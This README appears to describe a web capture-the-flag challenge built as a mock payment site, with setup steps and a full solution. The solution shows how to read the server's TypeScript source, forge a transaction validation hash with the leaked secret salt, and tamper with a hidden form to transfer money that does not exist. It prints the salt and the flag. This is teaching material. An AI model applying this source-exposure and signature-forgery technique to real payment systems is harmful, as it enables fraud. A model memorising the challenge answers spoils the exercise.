# PayMeYourMoney
PayPal'ish web CTF challenge.

## Description:

A successful deal is the one where your money always reaches its destination. That is why you should to use our payment system! We **type of** love using new technologies there. For sure, you'll love it!

## Setup:
**Option 1**: Using Docker
1) Build the docker image:
```bash
docker build -t <your username>/pay-me-your-money .
```
2) Run the container:
```bash
docker run -p 2012:2012 -d <your username>/pay-me-your-money
```
3) Connect via your browser to http://127.0.0.1:2012/

**Option 2**: Host directly using Node
1) Enter **PayMeYourMoney** cloned directory.
2) Run:
```
node ./dist/index.js
```
Note, that you should **not** run it directly from the *dist* folder. 

3) Connect via your browser to http://127.0.0.1:2012/

## Solution:
1) There is a hint the website's footer:
```
We type of love using new technologies...
```
It refers to **TypeScript**, which is compiled strongly typed JavaScript.

2) We know that TypeScript uses **.ts** file extensions. So, we check if the router was configured properly:
```
http://127.0.0.1:2012/index.ts
```
Gotcha! Now we have backend's sources!

3) Let's invistigate **the router**. We have its path from index.ts:
```
http://127.0.0.1:2012/components/app/controllers/router.ts
```

4) It looks like the only check for user's balance is in ```router.post("/confirm"...```:
```TypeScript
if (+amount > card.balance) {
    new StatusView("Not enough money!", "Sorry, but you can not give more than you have...").render(response);
    return;
}
```

But the actual transaction happens in ```router.post("/pay"...```!

5) We cannot simply call */pay*, because it checks for a validation hash sum generated by */confirm*. But since we have its sources, we are able to generate the transaction signature ourselves!
```TypeScript
const hasher = Crypto.createHash("sha256");
const hash = hasher.update(
    (+from + +to).toString() + to.toString() + card.transactions +
    amount + "7h15_15_7h3_50l71357_50l7_y0u_h4v3_3v3r_533n!"
).digest("hex");
```

6) Let's try it. Firstly, we create a new account. Then, we add another card to it. (We can enable **Add Card** button by inspecting the HTML element).
```HTML
<form action="/addcard" method="post">
    <input type="hidden" name="name" value="Personal Card">
    <button class="add-card">Add Card</button>
</form>
```
You can even change the card's name if you want to.

7) Remembering the new card's ID(in our example it's **8797 1237 1586 5698**), we go to the **transfer** page. Let us send some money to our new card!

8)  Now we have this form:
```HTML
<form action="/pay" method="post">
    <input type="hidden" name="from" value="9875910160063706">
    <input type="hidden" name="to" value="8797123715865698">
    <input type="hidden" name="amount" value="100">
    <input type="hidden" name="validation" value="d661800d00a65f27fb942cdfb44a4831b6c25e30a2d38ae3918467bed43e72ab">
    <button type="submit">Confirm</button>
</form>
```

Here we change the amount and the validation using the hash function. Let it be 9,999,999.
```JavaScript
const c = require("crypto");
const hasher = c.createHash("sha256");
const hash = hasher.update(
    (+"9875910160063706" + +"8797123715865698").toString() + "8797123715865698".toString() + "0" +
    "9999999" + "7h15_15_7h3_50l71357_50l7_y0u_h4v3_3v3r_533n!"
).digest("hex");
```
Note, that we set ```card.transactions``` to ```0``` since it was a newly created card and it does not have any transactions yet.
```bash
> hash
'25b580249777fb6f780d9d02388e77ea11d0d926e21516ee86a2a01c9b969631'
```

1) Now we send the modified form:
```HTML
<input type="hidden" name="amount" value="9999999">
<input type="hidden" name="validation" value="25b580249777fb6f780d9d02388e77ea11d0d926e21516ee86a2a01c9b969631">
```

10) Success!
You successfuly transfered 9999999!

11)  To get the flag you should go to **FlagsStore**. It can be found in *Advertisements Section* in the right bottom of the *profile* page.

12) Now we have enough money to buy the flag!
```
You did it!
Enjoy your flag: ELON{4lw4y5_pr073c_y0ur_5rc_4nd_7r4n54c710n5}.
```